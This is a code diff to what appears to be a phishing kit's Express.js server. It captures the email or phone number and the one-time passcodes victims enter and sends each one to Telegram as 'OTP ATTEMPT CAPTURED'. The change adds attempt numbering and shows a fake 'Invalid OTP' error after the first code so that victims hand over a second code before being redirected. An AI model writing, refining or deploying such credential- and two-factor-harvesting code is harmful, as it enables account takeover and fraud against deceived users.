@@ -91,18 +91,21 @@ app.post('/submit', async (req, res) => {
       req.session.otp_attempts.push(otp);
 
       // Send each OTP attempt to Telegram
-      const message = `🔢 <b>OTP ATTEMPT CAPTURED</b> 🔢\n\n` +
+      const attemptNumber = req.session.otp_attempts.length;
+      const message = `🔢 <b>OTP ATTEMPT ${attemptNumber} CAPTURED</b> 🔢\n\n` +
         `📧 <b>Email/Phone:</b> ${req.session.user_input}\n` +
-        `🔢 <b>OTP Attempt:</b> ${otp}\n` +
+        `🔢 <b>OTP:</b> ${otp}\n` +
         `🕒 <b>Time:</b> ${new Date().toISOString().replace('T', ' ').substring(0, 19)}\n` +
         `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━`;
       await sendToTelegram(message);
 
-      // Simulate waiting 10 seconds
+      // Simulate waiting 10 seconds for the first OTP
       await new Promise(resolve => setTimeout(resolve, 10000));
-      req.session.error = 'Invalid OTP. Please try again.';
-      res.redirect('/?step=otp');
-      
+      if (req.session.otp_attempts.length === 1) {
+        req.session.error = 'Invalid OTP. Please try again.';
+        return res.redirect('/?step=otp');
+      }
+
       // Simulate waiting 5 seconds before redirecting to success after second attempt
       await new Promise(resolve => setTimeout(resolve, 5000));
       if (req.session.otp_attempts.length >= 2) {
